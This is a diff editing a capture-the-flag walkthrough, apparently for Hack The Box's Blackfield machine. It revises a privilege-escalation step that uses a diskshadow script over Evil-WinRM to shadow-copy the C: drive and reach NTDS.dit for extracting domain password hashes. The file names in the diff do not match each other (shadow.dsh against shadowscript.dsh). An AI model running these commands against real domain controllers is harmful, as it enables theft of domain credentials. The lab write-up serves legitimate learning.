@@ -107,26 +107,23 @@ We got both the files required to extract NTLM hashes of Domain accounts using I
 ## PrivEsc Method #2 - diskshadow
 In second method, the strategy would be the same to grab **NTDS.dit**, but instead we’ll use a different windows tool named **diskshadow**.
 
-> Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).
+> Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS). This is a built-in function of Windows that can help us create a copy of a drive that is currently in use. 
 
-First, create a text file called **script.txt** which contains the following:
+First, we will be creating a **Distributed Shell File** or a **dsh** file which will consist of all the commands that are required by the diskshadow to run and create a full copy of our Windows Drive which we then can use to extract the **ntds.dit** file from. In this file, we are instructing the **diskshadow** to create a copy of the **C:** Drive into a **w:** Drive with **mydrive** as its alias. The Drive Alias and Character can be anything you want. After creating this dsh file, we need to use the **unix2dos** to convert the encoding and spacing of the dsh file to the one that is compatible with the Windows Machine.
 ```console
-{
-set context persistent nowriters  
-set metadata C:\Windows\Temp\example.cab  
-set verbose on  
-begin backup  
-add volume c: alias mydrive  
- 
-create  
-  
-expose %mydrive% w:  
-end backup  
-}
+set context persistent nowriters
+add volume c: alias mydrive
+create
+expose %mydrive% w:
+```
+In local machine:
+```console
+┌─[kimkhuongduy@drgon]─[~/Documents/hackthebox/Blackfield]
+└──╼ $unix2dos shadow.dsh
 ```
 Then execute the diskshadow and using the script file as its inputs.
 ```console
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s script.txt
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s shadowscript.dsh
 ```
 
 Now, to perform the task of copying the data of the NTDS.dit file, there are two ways to do it:
